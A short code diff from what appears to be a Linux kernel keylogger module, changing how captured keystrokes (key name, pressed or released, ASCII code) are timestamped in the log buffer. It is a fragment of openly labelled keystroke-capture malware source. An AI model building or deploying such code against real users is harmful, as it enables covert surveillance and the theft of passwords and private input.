@@ -49,13 +49,13 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 	memset(tmp, 0, 60);
 	memset(klg_buffer, 0, 60 * size);
 	list_for_each_entry(ks, &keystroke_list, list) {
-		written = sprintf(tmp, "[time] %s %s %x\n", ks->name, (ks->state == 0) ? "PRESSED" :
-			"RELEASED", ks->ascii);
-		strncat(klg_buffer, tmp, written);	
+		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
+			ks->tm.tm_mon + 1, ks->tm.tm_mday, ks->tm.tm_hour, ks->tm.tm_min, ks->tm.tm_sec,
+			ks->name, (ks->state == 0) ? "PRESSED" : "RELEASED", ks->ascii);
+		strncat(klg_buffer, tmp, written);
 	}
 
 	/* init dev->size to length of klg_buffer */
-	
 
 err:
 	return retval;
